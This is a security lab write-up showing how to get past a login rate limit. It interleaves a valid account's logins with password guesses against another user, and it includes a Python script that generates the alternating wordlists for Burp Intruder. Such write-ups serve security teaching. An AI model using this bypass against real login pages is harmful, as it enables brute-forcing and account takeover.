# Broken brute-force protection, IP block

## Information

- Lab: Authentication vulnerabilities
- Level: PRACTITIONER
- Description:

     ![](<Images/Broken brute-force protection, IP block 0.png>)

## Solution

Open the website, log in with the lab credentials, and capture the request in Burp.

```text
wiener:peter
```

![](<Images/Broken brute-force protection, IP block 1.png>)

Try logging in with invalid credentials (here I used a wrong password).

![](<Images/Broken brute-force protection, IP block 2.png>)

I noticed that after sending 2 failed login requests, the 3rd request returned this message:

```text
You have made too many incorrect login attempts. Please try again in 1 minute(s)
```

![](<Images/Broken brute-force protection, IP block 3.png>)

This means after every 3 failed login attempts, we must wait 1 minute before trying again. This makes dictionary attacks harder.

To bypass this protection and find the password for `carlos`, after every 2 failed attempts, I used the valid account `wiener:peter` to send a successful login request.

The payload looks like this:

```text
carlos     password_1
carlos     password_2
wiener     peter
carlos     password_3
carlos     password_4
wiener     peter
...
```

Using the password list provided by the lab, I wrote a simple Python script to generate the `username` and `password` lists for the attack.

```python
def username():
    print("----- USERNAME -----\n")

    for x in range(120):
        if x % 3 == 0:
            print("wiener")
        else:
            print("carlos")

def password():
    print("----- PASSWORD -----\n")

    with open(r"<Path_to_password.txt>", 'r') as f:
        count = 0

        for line in f:
            if count % 3 == 0:
                print("peter")
            else:
                print(line.strip())
            
            count += 1
            

if __name__ == "__main__":

    username()
    password()
```

After running the script, I got the username and password lists. I loaded them into `Intruder` to start the attack.

![](<Images/Broken brute-force protection, IP block 4.png>)

As you can see in the image, most payloads returned this pattern in the `Status code` column:

```text
200
200
302
200
200
302
```

But the payload `carlos:ginger` showed a different pattern:

```text
200
302
302
```

This means I found the correct password for `carlos`.

After logging in, the lab was solved.

![](<Images/Broken brute-force protection, IP block 5.png>)